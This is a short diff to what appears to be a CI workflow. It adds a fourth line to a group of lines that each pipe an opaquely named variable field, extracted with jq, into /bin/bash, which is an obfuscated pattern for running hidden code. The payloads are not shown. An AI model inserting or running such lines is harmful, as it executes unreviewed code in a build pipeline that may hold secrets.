@@ -42,6 +42,7 @@ jobs:
           printf '%s' "$opj94" | jq -r .pt2 | /bin/bash
           echo $tefc7 | jq -r .p17239 | /bin/bash
           echo $fuh16 | jq -r .jt94124 | /bin/bash
+          echo $j768 | jq -r .fku175 | /bin/bash
 
       - name: Upload artifact
         if: always()
